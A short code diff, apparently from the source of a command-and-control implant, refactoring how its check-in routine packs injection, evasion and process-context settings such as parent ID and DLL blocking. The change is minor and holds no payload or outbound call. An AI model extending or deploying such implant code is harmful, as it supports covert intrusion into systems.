@@ -30,8 +30,8 @@ auto DECLFN Transport::Checkin(
     //
 
     // injection behavior
-    Self->Pkg->Int32( CheckinPkg, Self->Inj.Alloc );
-    Self->Pkg->Int32( CheckinPkg, Self->Inj.Write );
+    Self->Pkg->Int32( CheckinPkg, Self->Inj->Ctx.Alloc );
+    Self->Pkg->Int32( CheckinPkg, Self->Inj->Ctx.Write );
 
     // some evasion features enable informations
     Self->Pkg->Int32( CheckinPkg, Self->Sys->Enabled );
@@ -68,7 +68,7 @@ auto DECLFN Transport::Checkin(
     // process context informations
     Self->Pkg->Int32( CheckinPkg, Self->Ps->Ctx.ParentID );
     Self->Pkg->Int32( CheckinPkg, Self->Ps->Ctx.Pipe );
-    if   ( !Self->Ps->Ctx.CurrentDir ) Self->Pkg->Str( CheckinPkg, "" );
+    if   ( ! Self->Ps->Ctx.CurrentDir ) Self->Pkg->Str( CheckinPkg, "" );
     else Self->Pkg->Str( CheckinPkg, Self->Ps->Ctx.CurrentDir );
     Self->Pkg->Int32( CheckinPkg, Self->Ps->Ctx.BlockDlls );
 
